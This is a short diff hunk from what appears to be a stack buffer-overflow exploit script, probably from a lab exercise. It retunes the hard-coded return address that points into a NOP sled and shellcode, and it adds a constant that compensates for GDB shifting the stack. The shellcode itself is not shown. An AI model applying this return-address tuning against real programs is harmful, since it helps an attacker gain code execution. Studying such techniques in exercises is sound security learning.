@@ -15,7 +15,9 @@ SHELLCODE_LEN = len(SHELLCODE)
 ADD_LEN = 8  # Length of the address 4 for 32-bit and 8 for 64-bit
 NOP_LEN = PAYLOAD_LEN - SHELLCODE_LEN
 
-RET_ADD = 0x7fffffffd090 + 300  # FIXME: Change this address
+# FIXME if needed
+GDB_SHIFT_COMPENSATION = 200 # stack is shigted higher in GDB due to its own environment variables, args, etc.
+RET_ADD = 0x7fffffffc850 + GDB_SHIFT_COMPENSATION  # FIXME: Change this address
 
 # Remove the 00 from the address
 # Note, 300 is added because the address shown in the gdb is different from
